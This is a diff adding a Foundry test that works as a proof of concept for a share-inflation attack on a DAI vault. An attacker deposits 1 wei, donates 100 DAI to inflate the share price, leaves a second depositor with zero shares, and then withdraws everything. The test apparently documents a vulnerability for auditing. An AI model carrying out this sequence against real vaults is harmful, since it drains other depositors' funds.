@@ -98,4 +98,51 @@ contract TestVault is Test{
          // This further confirms there will be no leftover funds in the vault after every withdrawal
         assertEq(IERC20(DAI).balanceOf(address(vault)),0);
     }
+
+    function testVaultInflation() public {
+        deal(DAI,address(this),1000e18,true);
+        IERC20(DAI).approve(address(vault), 10e18);
+
+        // attacker(user one) minting as low as he can that is 1 wei
+        vault.deposit(1);
+
+        //attacker transferring alot of funds to inflate share price.
+        IERC20(DAI).transfer(address(vault),100e18);
+
+        //checking balance of user one after deposit
+        uint256 bal = IERC20(DAI).balanceOf(address(this));
+
+        // second user(Bob) funding address
+        deal(DAI,address(0xcab),10e18);
+        // approving vault to spend shares
+        vm.prank(address(0xcab));
+        IERC20(DAI).approve(address(vault),10e18);
+        // Bob depositing some assets
+        vm.prank(address(0xcab));
+        vault.deposit(10e18);
+
+        console2.log("Vault balance after inflation attack: ", IERC20(DAI).balanceOf(address(vault)));
+
+        // we can confirm by the logs that due to inflation bob was minted 0 shares
+        console2.log("Bob deposited: ", vault.balanceOf(address(0xcab)));
+        console2.log("User one deposited: ", vault.balanceOf(address(this)));
+        console2.log("Total Supply: ", vault.totalSupply());
+        assertEq(vault.balanceOf(address(0xcab)),0);
+
+        // now lets try to withdraw the 1 wei and see what user one(attacker) gets
+        vault.withdraw(1);
+        // After withdrawal balance
+        uint256 currentBal = IERC20(DAI).balanceOf(address(this));
+
+        assertGt(currentBal, bal);
+        assertGt(currentBal-bal, 100e18);
+        // from the log we can tell that the user drained absolutely all the funds in the vault
+        // i.e initial 1 wei depositied by user one(attacker) + 100e18 (sent to the vault by attacker) + 10e18 (Bob's deposit)
+        console2.log("The difference between the old and new balance: ", currentBal - bal);
+        assertEq(currentBal - bal, 100e18 + 1 + 10e18);
+
+        // now lets confirm the vault was successfully drained
+        assertEq(IERC20(DAI).balanceOf(address(vault)),0);
+        console2.log("Vault balance after attacker's withdrawal: ", IERC20(DAI).balanceOf(address(vault)));
+    }
 }
